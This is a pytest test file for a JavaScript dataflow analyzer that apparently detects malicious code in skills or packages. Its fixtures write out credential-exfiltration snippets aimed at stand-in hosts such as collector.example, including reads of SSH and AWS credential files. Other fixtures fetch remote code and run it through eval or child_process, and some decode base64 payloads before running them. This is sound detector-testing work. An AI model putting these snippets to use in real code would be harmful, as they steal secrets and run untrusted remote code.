# Copyright 2026 Cisco Systems, Inc.
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# SPDX-License-Identifier: Apache-2.0

"""Focused safety and recall contracts for bounded JS/TS dataflow."""

from __future__ import annotations

import time
from dataclasses import asdict

import pytest

from skill_scanner.core.static_analysis.javascript_dataflow import (
    MAX_JAVASCRIPT_DATAFLOW_BYTES,
    JavascriptFlowFact,
    analyze_javascript_dataflow,
)


def _flows(source: str) -> set[tuple[str, str, tuple[str, ...]]]:
    return {(flow.source_class, flow.sink_class, flow.transforms) for flow in analyze_javascript_dataflow(source).flows}


def test_sensitive_environment_reaches_fetch_payload_with_normalized_metadata() -> None:
    result = analyze_javascript_dataflow(
        """
const secret = process.env.API_TOKEN;
await fetch("https://collector.example/upload", {
  method: "POST",
  body: JSON.stringify({secret}),
});
"""
    )

    assert result.complete is True
    assert _flows(
        """const secret = process.env.API_TOKEN;
fetch("https://collector.example/upload", {method: "POST", body: JSON.stringify({secret})});"""
    ) == {("sensitive_environment", "network", ())}
    assert {source.source_class for source in result.sources} == {
        "environment_reference",
        "sensitive_environment",
    }
    assert len(result.networks) == 1
    network = result.networks[0]
    assert network.api_class == "fetch"
    assert network.method == "post"
    assert network.direction == "outbound"
    assert network.credential_use == "payload"
    assert network.source_classes == ("sensitive_environment",)
    assert [(endpoint.scheme, endpoint.host) for endpoint in network.endpoints] == [("https", "collector.example")]


def test_semicolonless_asi_declarations_and_imports_preserve_each_stage() -> None:
    result = analyze_javascript_dataflow(
        """
import {exec as run} from "node:child_process"
const token = process.env.API_TOKEN
fetch("https://collector.example/upload", {method: "POST", body: token})
const response = await fetch("https://updates.example/stage.js")
const program = await response
  .text()
run(program)
"""
    )

    assert result.complete is True
    assert {(flow.source_class, flow.sink_class) for flow in result.flows} == {
        ("sensitive_environment", "network"),
        ("network", "code_execution"),
    }
    assert result.executions[0].api_class == "child_process.exec"


def test_literal_credential_file_reaches_fetch_and_axios_payloads() -> None:
    fetch_result = analyze_javascript_dataflow(
        """
import {readFileSync as read} from "node:fs";
const privateKey = read("/home/user/.ssh/id_rsa");
fetch("https://collector.example/key", {method: "POST", body: privateKey});
"""
    )
    axios_result = analyze_javascript_dataflow(
        """
const fs = require("fs");
const axios = require("axios");
const credentials = fs.readFileSync("/home/user/.aws/credentials");
axios.post("https://collector.example/key", credentials);
"""
    )

    expected = {("credential_file", "network", ())}
    assert {(flow.source_class, flow.sink_class, flow.transforms) for flow in fetch_result.flows} == expected
    assert {(flow.source_class, flow.sink_class, flow.transforms) for flow in axios_result.flows} == expected
    assert fetch_result.sources[0].source_class == "credential_file"
    assert axios_result.networks[0].api_class == "axios.post"


@pytest.mark.parametrize(
    "source,api_class",
    [
        (
            """
const response = await fetch("https://updates.example/stage.js");
const program = await response.text();
eval(program);
""",
            "eval",
        ),
        (
            """
const {exec: run} = require("node:child_process");
const response = await fetch("https://updates.example/stage.js");
const program = await response.text();
run(program);
""",
            "child_process.exec",
        ),
        (
            """
import * as cp from "node:child_process";
const response = await fetch("https://updates.example/stage.js");
cp.exec(await response.text());
""",
            "child_process.exec",
        ),
    ],
)
def test_network_response_reaches_proven_execution_aliases(source: str, api_class: str) -> None:
    result = analyze_javascript_dataflow(source)

    assert result.complete is True
    assert result.flows == (JavascriptFlowFact("network", "code_execution", (), result.executions[0].line),)
    assert result.executions[0].api_class == api_class
    assert result.executions[0].source_classes == ("network",)


def test_base64_buffer_decode_reaches_eval_but_other_encoding_does_not() -> None:
    positive = analyze_javascript_dataflow(
        """
const program = Buffer.from(encodedProgram, "base64").toString("utf8");
eval(program);
"""
    )
    near_miss = analyze_javascript_dataflow(
        """
const program = Buffer.from(document, "utf8").toString("utf8");
eval(program);
"""
    )

    assert positive.transforms[0].transform == "base64_decode"
    assert positive.flows == (JavascriptFlowFact("obfuscation", "code_execution", ("decode",), 3),)
    assert near_miss.transforms == ()
    assert near_miss.flows == ()


def test_environment_controls_spawn_executable_and_argv_through_namespace_and_destructure() -> None:
    namespace = analyze_javascript_dataflow(
        """
const cp = require("child_process");
const executable = process.env.RUNNER_BIN;
const argument = process.env.RUNNER_ARG;
cp.spawn(executable, [argument]);
"""
    )
    destructured = analyze_javascript_dataflow(
        """
import {spawn as launch} from "node:child_process";
launch(process.env.RUNNER_BIN, [process.env.RUNNER_ARG]);
"""
    )

    for result in (namespace, destructured):
        assert result.complete is True
        assert result.executions[0].api_class == "child_process.spawn"
        assert result.executions[0].source_classes == ("environment_reference",)
        assert result.flows == (
            JavascriptFlowFact("environment_reference", "code_execution", (), result.executions[0].line),
        )


@pytest.mark.parametrize(
    "destination,destination_class",
    [
        ('"//fileserver.example/share/loot.txt"', "unc_path"),
        ("process.env.OUTPUT_PATH", "environment_controlled"),
    ],
)
def test_sensitive_environment_write_requires_unc_or_environment_controlled_destination(
    destination: str,
    destination_class: str,
) -> None:
    source = f"""
const fs = require("node:fs");
const secret = process.env.API_TOKEN;
fs.writeFileSync({destination}, secret);
"""
    result = analyze_javascript_dataflow(source)

    assert result.complete is True
    assert result.filesystem_writes[0].destination_class == destination_class
    assert result.filesystem_writes[0].source_classes == ("sensitive_environment",)
    assert ("sensitive_environment", "filesystem_write", ()) in {
        (flow.source_class, flow.sink_class, flow.transforms) for flow in result.flows
    }


def test_local_constant_write_and_unrelated_sensitive_value_are_near_misses() -> None:
    result = analyze_javascript_dataflow(
        """
const fs = require("node:fs");
const secret = process.env.API_TOKEN;
fs.writeFileSync("./output.txt", "public report");
"""
    )

    assert result.complete is True
    assert result.filesystem_writes == ()
    assert not any(flow.sink_class == "filesystem_write" for flow in result.flows)


def test_provider_bound_https_authentication_is_typed_but_not_actionable() -> None:
    result = analyze_javascript_dataflow(
        """
const token = process.env.GITHUB_TOKEN;
fetch("https://api.github.com/user", {
  headers: {Authorization: token},
});
"""
    )

    assert result.complete is True
    assert result.networks[0].credential_use == "authentication"
    assert result.networks[0].source_classes == ("sensitive_environment",)
    assert result.networks[0].provider_bound_authentication is True
    assert not any(flow.sink_class == "network" for flow in result.flows)


@pytest.mark.parametrize(
    "credential,url",
    [
        ("API_TOKEN", '"https://api.github.com/user"'),
        ("GITHUB_TOKEN", '"https://collector.example/upload"'),
        ("GITHUB_TOKEN", '"http://api.github.com/user"'),
        ("GITHUB_TOKEN", "endpoint"),
    ],
)
def test_generic_foreign_insecure_or_dynamic_authentication_remains_actionable(
    credential: str,
    url: str,
) -> None:
    result = analyze_javascript_dataflow(
        f"""const token = process.env.{credential};
const endpoint = getEndpoint();
fetch({url}, {{headers: {{Authorization: token}}}});
"""
    )

    assert result.complete is True
    assert result.networks[0].credential_use == "authentication"
    assert result.networks[0].provider_bound_authentication is False
    assert ("sensitive_environment", "network", ()) in {
        (flow.source_class, flow.sink_class, flow.transforms) for flow in result.flows
    }


@pytest.mark.parametrize("name", ["AUTHOR", "AUTHORS", "AUTHORITY", "AUTHORIZED_USERS"])
def test_auth_prefix_words_are_not_classified_as_credentials(name: str) -> None:
    result = analyze_javascript_dataflow(
        f"""const value = process.env.{name}
fetch("https://api.example/profile", {{method: "POST", body: value}})
"""
    )

    assert result.complete is True
    assert {source.source_class for source in result.sources} == {"environment_reference"}
    assert result.networks[0].source_classes == ()
    assert not any(flow.sink_class == "network" for flow in result.flows)


@pytest.mark.parametrize(
    "source,api_class",
    [
        (
            """const token = process.env.API_TOKEN;
fetch("https://collector.example/upload", {["body"]: token});
""",
            "fetch",
        ),
        (
            """const token = process.env.API_TOKEN;
const base = {body: token};
fetch("https://collector.example/upload", {...base, method: "POST"});
""",
            "fetch",
        ),
        (
            """const token = process.env.API_TOKEN;
const options = {method: "POST"};
options.body = token;
fetch("https://collector.example/upload", options);
""",
            "fetch",
        ),
        (
            """const axios = require("axios");
const token = process.env.API_TOKEN;
const options = {data: token, url: "https://collector.example/upload", method: "POST"};
axios.request(options);
""",
            "axios.request",
        ),
        (
            """import {request} from "undici";
const token = process.env.API_TOKEN;
request("https://collector.example/upload", {method: "POST", body: token});
""",
            "undici.request",
        ),
        (
            """const token = process.env.API_TOKEN;
navigator.sendBeacon("https://collector.example/upload", token);
""",
            "navigator.sendBeacon",
        ),
    ],
)
def test_reviewed_payload_shapes_preserve_sensitive_provenance(source: str, api_class: str) -> None:
    result = analyze_javascript_dataflow(source)

    assert result.complete is True
    assert result.networks[0].api_class == api_class
    assert result.networks[0].source_classes == ("sensitive_environment",)
    assert ("sensitive_environment", "network", ()) in {
        (flow.source_class, flow.sink_class, flow.transforms) for flow in result.flows
    }


@pytest.mark.parametrize(
    "expression",
    [
        "`${process.env.API_TOKEN}@collector.example`",
        '"token=" + process.env.API_TOKEN',
        "encodeURIComponent(process.env.API_TOKEN)",
        "new URLSearchParams({token: process.env.API_TOKEN})",
    ],
)
def test_reviewed_value_preserving_forms_reach_network(expression: str) -> None:
    result = analyze_javascript_dataflow(
        f"""const body = {expression};
fetch("https://collector.example/upload", {{method: "POST", body}});
"""
    )

    assert result.complete is True
    assert _flows(
        f"""const body = {expression};
fetch("https://collector.example/upload", {{method: "POST", body}});
"""
    ) == {("sensitive_environment", "network", ())}


def test_computed_authentication_header_obeys_provider_binding() -> None:
    bound = analyze_javascript_dataflow(
        """const token = process.env.GITHUB_TOKEN;
fetch("https://api.github.com/user", {headers: {["Authorization"]: token}});
"""
    )
    foreign = analyze_javascript_dataflow(
        """const token = process.env.GITHUB_TOKEN;
fetch("https://collector.example/upload", {headers: {["Authorization"]: token}});
"""
    )

    assert bound.complete and foreign.complete
    assert bound.networks[0].provider_bound_authentication is True
    assert not bound.flows
    assert foreign.networks[0].provider_bound_authentication is False
    assert _flows(
        """const token = process.env.GITHUB_TOKEN;
fetch("https://collector.example/upload", {headers: {["Authorization"]: token}});
"""
    ) == {("sensitive_environment", "network", ())}


def test_dynamic_computed_payload_key_fails_open_as_incomplete() -> None:
    result = analyze_javascript_dataflow(
        """const token = process.env.API_TOKEN;
const field = chooseField();
fetch("https://collector.example/upload", {[field]: token});
"""
    )

    assert result.complete is False
    assert result.error_codes == ("JS_DATAFLOW_AMBIGUOUS_NETWORK_PAYLOAD",)
    assert result.sources == result.networks == result.executions == result.transforms == result.flows == ()


@pytest.mark.parametrize(
    "source",
    [
        """const https = require("node:https");
https.get("https://updates.example/stage.js", response => response.on("data", eval));
""",
        """const xhr = new XMLHttpRequest();
xhr.open("GET", "https://updates.example/stage.js");
xhr.onload = () => eval(xhr.responseText);
""",
        """const socket = new WebSocket("wss://updates.example/stage");
socket.onmessage = event => eval(event.data);
""",
    ],
)
def test_explicit_unsupported_callback_or_stateful_apis_do_not_invent_flows(source: str) -> None:
    result = analyze_javascript_dataflow(source)

    assert result.complete is True
    assert result.flows == ()


def test_disconnected_shadowed_and_cross_scope_values_do_not_create_flows() -> None:
    disconnected = analyze_javascript_dataflow(
        """
const secret = process.env.API_TOKEN;
const response = fetch("https://updates.example/info.json");
eval("2 + 2");
"""
    )
    shadowed = analyze_javascript_dataflow(
        """
function inspect(eval, fetch, Buffer) {
  const response = fetch("https://updates.example/info.json");
  const decoded = Buffer.from(value, "base64");
  eval(response);
}
"""
    )
    separate_scope = analyze_javascript_dataflow(
        """
{
  const response = fetch("https://updates.example/stage.js");
  const program = response.text();
}
eval(program);
"""
    )

    assert not disconnected.flows
    assert not shadowed.networks and not shadowed.transforms and not shadowed.executions
    assert not separate_scope.flows


def test_comments_strings_and_regex_literals_are_inert() -> None:
    result = analyze_javascript_dataflow(
        r"""
// eval(await fetch("https://evil.example/payload"))
const sample = "Buffer.from(secret, 'base64'); eval(secret)";
const detector = /process\.env\.TOKEN.*fetch\(/;
"""
    )

    assert result.complete is True
    assert result.sources == result.networks == result.executions == result.transforms == result.flows == ()


@pytest.mark.parametrize(
    "source,error_code",
    [
        (
            'const token = process.env.API_TOKEN; fetch("https://evil.example", {body: token}); /*',
            "JS_DATAFLOW_UNCLOSED_COMMENT",
        ),
        ('eval(await fetch("https://evil.example")', "JS_DATAFLOW_SYNTAX_DELIMITER"),
        ("identifier " * 16_385, "JS_DATAFLOW_TOKEN_LIMIT"),
    ],
)
def test_malformed_or_budget_input_fails_open_without_partial_facts(source: str, error_code: str) -> None:
    result = analyze_javascript_dataflow(source)

    assert result.complete is False
    assert result.error_codes == (error_code,)
    assert result.sources == result.networks == result.executions == result.transforms == result.flows == ()


def test_file_and_provenance_hop_limits_fail_open() -> None:
    oversized = analyze_javascript_dataflow("x" * (MAX_JAVASCRIPT_DATAFLOW_BYTES + 1))
    aliases = "const a0 = process.env.API_TOKEN;\n" + "".join(f"const a{index + 1} = a{index};\n" for index in range(9))
    aliases += 'fetch("https://evil.example", {body: a9});\n'
    over_hops = analyze_javascript_dataflow(aliases)

    assert oversized.complete is False
    assert oversized.error_codes == ("JS_DATAFLOW_FILE_LIMIT",)
    assert over_hops.complete is False
    assert over_hops.error_codes == ("JS_DATAFLOW_HOP_LIMIT",)
    assert over_hops.flows == ()


def test_whitespace_comments_and_identifier_renaming_preserve_flow_classes() -> None:
    variants = [
        """const response=await fetch("https://updates.example/stage");const code=await response.text();eval(code);""",
        """const downloaded = await fetch("https://updates.example/stage");
// provenance-preserving comment
const program = await downloaded.text();
eval(program);""",
        """const x = await globalThis.fetch("https://updates.example/stage");
const y = await x.text();
globalThis.eval(y);""",
    ]

    outputs = [_flows(source) for source in variants]
    assert outputs == [{("network", "code_execution", ())}] * len(variants)


def test_five_runs_are_identical_and_near_token_budget_is_fast() -> None:
    source = """
const response = await fetch("https://updates.example/stage");
const program = await response.text();
eval(program);
"""
    runs = [asdict(analyze_javascript_dataflow(source)) for _ in range(5)]
    large_safe = "helper(value);\n" * 2_500
    started = time.monotonic()
    result = analyze_javascript_dataflow(large_safe)
    elapsed = time.monotonic() - started

    assert all(run == runs[0] for run in runs[1:])
    assert result.complete is True
    assert result.flows == ()
    assert result.tokens_processed == 12_500
    assert elapsed < 3.0
